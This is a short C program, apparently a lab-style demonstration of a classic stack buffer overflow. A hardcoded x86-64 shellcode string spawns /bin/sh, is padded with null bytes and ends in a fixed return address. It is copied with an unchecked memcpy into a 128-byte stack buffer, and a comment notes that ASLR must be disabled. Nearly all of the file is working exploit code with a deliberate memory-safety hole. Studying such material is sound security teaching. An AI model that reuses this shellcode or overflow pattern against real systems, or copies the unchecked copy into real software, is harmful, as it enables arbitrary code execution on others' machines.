#include <string.h>

char shellcode[] =
    "\xeb\x21\x41\x58\x4d\x89\x40\x08\x31\xc0\x41\x89\x40\x10\x89\xc2\xb0\x3b"
    "\x49\x8d\x70\x08\x49\x8b\x78\x08\x0f\x05\x48\x31\xff\xb0\x3c\x0f\x05\xe8"
    "\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\xeb\xff\xff\xff\x7f\x00";

void foo(char *data, unsigned long sz) {
    char buf[128] = {0};
    // printf("%p\n", buf); // use this to get the addr of buf (ASLR must be
    // disabled of course)
    memcpy(buf, data, sz);
}

int main(void) {
    foo(shellcode, sizeof(shellcode));
    return 0;
}
